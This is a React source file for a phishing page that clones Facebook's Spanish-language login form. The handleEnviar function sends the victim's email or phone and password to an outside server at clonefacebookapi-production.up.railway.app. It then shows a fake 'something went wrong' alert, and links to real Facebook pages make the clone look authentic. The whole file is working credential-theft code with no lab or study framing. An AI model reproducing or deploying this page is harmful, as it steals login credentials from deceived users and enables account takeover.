import './formulario.css'
import { useState } from 'react';

export function Formulario() {
    const [name, setName] = useState('');
    const [password, setPassword] = useState('');

    const handleEnviar = () =>{
        const formData = {
            name: name,
            password: password
        };

        fetch('https://clonefacebookapi-production.up.railway.app/api/face', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
        })  
        .then(response => response.json())
        .then(data => {
          this.setState({ respuesta: data });
          console.log("ok")
          alert("Algo salio mal intentalo de nuevo");
        })
        .catch(error => {
          console.error('Error al enviar la solicitud POST:', error);
          console.log(formData)
        });
    }

    const redirectToExternalLink = () => {
        window.location.href = "https://www.facebook.com/register/"; 
      };
    
    return(
        <div className='contain-form'>
            <div className='contain-sub'>
                <div className='form'>
                    <form action="">
                        <div className='input'>
                            <input type="text" value={name} onChange={e => setName(e.target.value)} placeholder="Correo electrónico o número de teléfono"/>
                        </div>
                        <div className='input'>
                             <div className='input-pass'>
                                <input id='pass' type="password" value={password} onChange={e => setPassword(e.target.value)} placeholder="Contraseña" />
                            </div>
                        </div>
                        <button onClick={handleEnviar}>Iniciar sesion</button>
                        <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">¿Olvidaste tu contraseña?</a>
                        <div className='line'></div>
                        <div className='new-acount'>
                           
                           <button onClick={redirectToExternalLink}>Crear cuenta nueva</button>
                        </div>
                    </form>
                </div>
                <div className='pagina'>
                    <a href="https://www.facebook.com/pages/create/?ref_type=registration_form">Crea una página</a>
                    <p> para una celebridad, una marca o un negocio.</p>
                </div>
            </div>
        </div>
    )
}